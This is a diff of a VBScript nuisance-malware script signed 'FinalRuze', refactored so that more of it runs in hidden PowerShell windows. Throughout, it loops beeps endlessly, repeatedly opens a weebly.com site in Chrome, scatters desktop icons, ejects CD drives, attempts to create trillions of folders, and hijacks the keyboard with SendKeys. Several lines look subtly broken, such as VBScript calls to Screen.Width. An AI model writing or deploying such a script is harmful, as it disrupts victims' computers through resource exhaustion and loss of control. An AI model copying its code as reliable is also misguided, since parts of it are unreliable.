@@ -1,20 +1,15 @@
 ' Beep sound loop
-Do While True
-    CreateObject("WScript.Shell").Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
-Loop
+CreateObject("WScript.Shell").Run "PowerShell -Command ""while ($true) {[System.Media.SystemSounds]::Beep.Play(); Start-Sleep -Milliseconds 1000}""", 0, True
 
 ' Open website loop
-Do While True
-    CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
-    CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
-Loop
+CreateObject("WScript.Shell").Run "cmd /c start chrome https://j26nabr4tcsw908qiu.weebly.com/ & start chrome https://j26nabr4tcsw908qiu.weebly.com/", 0, False
 
 ' Move desktop items loop
 Set objShell = WScript.CreateObject("WScript.Shell")
 Set objShellApp = CreateObject("Shell.Application")
-Set objFolder = objShellApp.Namespace("C:\Users\" & strUserName & "\Desktop").Items
+Set objDesktop = objShellApp.Namespace(0)
 Do While True
-    For Each objItem In objFolder
+    For Each objItem In objDesktop.Items
         Randomize
         xPos = Int((Screen.Width - objItem.Width) * Rnd)
         yPos = Int((Screen.Height - objItem.Height) * Rnd)
@@ -24,35 +19,7 @@ Do While True
 Loop
 
 ' Eject CD loop
-Do
-    Dim ts
-    Dim strDriveLetter
-    Dim intDriveLetter
-    Dim fs
-    Const CDROM = 4
-    On Error Resume Next
-    Set fs = CreateObject("Scripting.FileSystemObject")
-    strDriveLetter = ""
-    For intDriveLetter = Asc("A") To Asc("Z")
-        Err.Clear
-        If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then
-            If Err.Number = 0 Then
-                strDriveLetter = Chr(intDriveLetter)
-                Exit For
-            End If
-        End If
-    Next
-    Set oWMP = CreateObject("WMPlayer.OCX.7" )
-    Set colCDROMs = oWMP.cdromCollection
-    For d = 0 to colCDROMs.Count - 1
-        colCDROMs.Item(d).Eject
-    Next
-    For d = 0 to colCDROMs.Count - 1
-        colCDROMs.Item(d).Eject
-    Next
-    set owmp = nothing
-    set colCDROMs = nothing
-loop
+CreateObject("WScript.Shell").Run "PowerShell -Command ""while ($true) {Add-Type -AssemblyName 'Microsoft.Win32'; $cdroms = Get-WmiObject -Class Win32_CDROMDrive; foreach ($cdrom in $cdroms) {$cdrom.Eject()}; Start-Sleep -Milliseconds 5000}""", 0, True
 
 ' Create many folders
 Const num_folders = 99999999999999
@@ -65,11 +32,11 @@ For i = 1 To num_folders
 Next
 
 ' Type some text and toggle lock keys
-set x=wscript.createobject ("wscript.shell")
-do
-    wscript.sleep 100
-    x.sendkeys "{CAPSLOCK}"
-    x.sendkeys "{NUMLOCK}"
-    x.sendkeys "This is the FinalRuze"
-    x.sendkeys "{SCROLLLOCK}"
-loop
+Set x=WScript.CreateObject ("WScript.Shell")
+Do While True
+    WScript.Sleep 100
+    x.SendKeys "{CAPSLOCK}"
+    x.SendKeys "{NUMLOCK}"
+    x.SendKeys "This is the FinalRuze"
+    x.SendKeys "{SCROLLLOCK}"
+Loop
